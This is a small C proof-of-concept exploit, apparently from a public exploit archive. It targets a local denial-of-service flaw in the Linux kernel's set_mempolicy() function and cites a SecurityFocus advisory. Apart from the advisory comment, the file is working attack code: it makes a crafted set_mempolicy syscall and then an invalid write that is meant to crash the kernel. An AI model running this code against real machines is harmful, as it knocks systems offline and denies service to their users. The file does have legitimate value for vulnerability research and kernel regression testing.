/*
source: http://www.securityfocus.com/bid/16135/info

Linux kernel is prone to a local denial-of-service vulnerability.

This issue affects the 'set_mempolicy()' function of the 'mm/mempolicy.c' file.

Successful exploitation causes the kernel to crash, leading to a denial-of-service condition. 
*/


#include <asm/unistd.h>

main(){
        syscall(__NR_set_mempolicy,3,0,0);
        write(1,10,8192);
}